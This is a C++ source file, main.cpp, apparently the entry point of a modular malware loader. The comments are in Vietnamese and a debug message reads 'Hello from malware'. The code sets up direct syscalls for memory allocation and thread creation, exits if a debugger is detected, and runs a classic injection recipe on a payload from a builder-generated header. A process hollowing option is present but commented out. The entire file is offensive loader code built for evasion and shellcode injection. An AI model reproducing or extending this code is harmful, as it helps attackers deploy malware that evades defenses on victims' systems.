// src/main.cpp

// Include các tiện ích cốt lõi
#include "core/utils.h"

// Include file tổng hợp các kỹ thuật (Recipes)
// File này sẽ tự động include các file con như alloc_local.h, exec_thread.h...
#include "techniques/recipes.h"
#include "techniques/0_anti_analysis/anti_debug.h" 

// File này được sinh bởi builder, không edit thủ công
#include "payload_data.h"

PVOID g_syscall_addr = NULL;
DWORD g_ssn_NtAllocateVirtualMemory = 0;
DWORD g_ssn_NtCreateThreadEx = 0;
DWORD g_ssn_NtWaitForSingleObject = 0;

// --- Entry Point ---
extern "C" int main() {
    
    DEBUG_MSG("Start", "Hello from malware");


    #ifdef USE_DIRECT_SYSCALLS
        if (!InitializeSyscalls()) return 1;
    #endif

    // Stage 0: Anti-Analysis (Global Check)
    #ifdef EVASION_CHECKS_ENABLED
        if (IsDebugged()) return 1;
    #endif

    #ifdef INJECTION_CLASSIC
        Recipe_Classic_Injection();
    #elif defined(INJECTION_HOLLOWING)
        // Recipe_Process_Hollowing();
    #endif

    return 0;
}